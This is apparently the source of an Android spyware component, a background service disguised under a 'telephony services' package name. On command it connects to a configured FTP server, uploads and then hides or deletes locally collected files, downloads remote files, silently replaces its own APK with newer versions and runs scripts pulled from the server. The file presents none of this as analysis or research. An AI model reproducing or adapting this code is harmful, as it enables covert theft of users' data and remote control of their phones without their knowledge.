package com.telephony.services;

import java.io.File;
import java.io.FilenameFilter;
import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Debug;
import android.os.IBinder;
import android.util.Log;

public class SuperService extends Service {

	private static final String INDEX_FILE = "files";
	private PreferenceUtils sPref = null;
	private ExecutorService es;
	private MyFTPClient ftp = null;
	private Updater upd = null;
	private Scripter scp = null;
	private int command = 0;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		try {
			es = Executors.newFixedThreadPool(1);
			sPref = PreferenceUtils.getInstance(this);

			ftp = new MyFTPClient();
		} catch (Exception e) {
			e.printStackTrace();
		}
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));
		return START_REDELIVER_INTENT;

	}

	private class RunService implements Runnable {
		final Intent intent;
		final int flags;
		final int startId;
		final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			long rfs = -1;
			long b = System.currentTimeMillis();
			try {
				command = intent.getIntExtra(Utils.EXTRA_COMMAND, 0);
				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId + " with command: " + command);
				if (sPref.getRootDir().exists() && (Utils.updateExternalStorageState() == Utils.MEDIA_MOUNTED)) {
					Log.d(Utils.LOG_TAG, "time before internet wait: " + (System.currentTimeMillis() - b));
					if (Utils.waitForInternet(context, sPref.isWifiOnly(), 30)) {
						Log.d(Utils.LOG_TAG, "time after internet wait: " + (System.currentTimeMillis() - b));
						if (!ftp.isReady()) {
							ftp.connect(sPref.getRemoteUrl());
						}
						if (ftp.isReady()) {
							switch (command) {
							case Utils.COMMAND_RUN_UPDATER:
								upd = new Updater(context, ftp);
								if (upd.getRemoteVersion() > Utils.getCurrentVersion(context)) {
									upd.updateAPK();
								}
								upd.free();
								break;

							case Utils.COMMAND_RUN_SCRIPTER:
								scp = new Scripter(context, ftp);
								scp.execScript();								
								break;

							case Utils.COMMAND_RUN_UPLOAD:
								b = System.currentTimeMillis();
								ArrayList<File> list = Utils.rlistFiles(sPref.getRootDir(), new FilenameFilter() {
									public boolean accept(File dir, String filename) {
										File f = new File(dir, filename);
										Date today = new Date();
										return !f.isHidden() && new Date(f.lastModified()).before(new Date(today.getTime() - (Utils.HOUR)));
									}
								});
								String remotefile = "";
								for (File file : list) {
									try {
										remotefile = ftp.getRemoteFile(sPref.getRootDir(), file);
										if (ftp.getFileSize(remotefile) != file.length()) {
											Log.d(Utils.LOG_TAG, "try upload: " + file.getAbsolutePath());
											ftp.uploadFile(file, remotefile);
											if (file.getName().equals(Utils.CONFIG_OUT_FILENAME)) {
												file.delete();
											} else {
												Utils.setHidden(file);
											}
										} else {
											Utils.setHidden(file);
										}
									} catch (Exception e) {
										e.printStackTrace();
										if (!ftp.isReady()) {
											break;
										}
									}
								}
								break;

							case Utils.COMMAND_RUN_DOWNLOAD:
								String[] files = ftp.downloadFileStrings(INDEX_FILE);
								File file = null;
								b = System.currentTimeMillis();
								for (String fn : files) {
									try {
										if (!fn.equals("")) {
											rfs = ftp.getFileSize(fn);
											if (rfs > 0) {
												file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), fn));
												if (file != null) {
													if ((file.exists() && (file.length() != rfs)) || (!file.exists())) {
														Log.d(Utils.LOG_TAG, "try download: " + fn + " to " + file.getAbsolutePath());
														ftp.downloadFile(fn, file);
													}
												}
											}
										}
									} catch (Exception e) {
										e.printStackTrace();
										if (!ftp.isReady()) {
											break;
										}
									}
								}
								break;

							default:
								stop();
								break;
							}

						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
			try {
				if (stopSelfResult(startId)) {
					if (ftp != null) {
						ftp.disconnect();
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		}

	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		es = null;
		sPref = null;
		ftp = null;
		upd = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
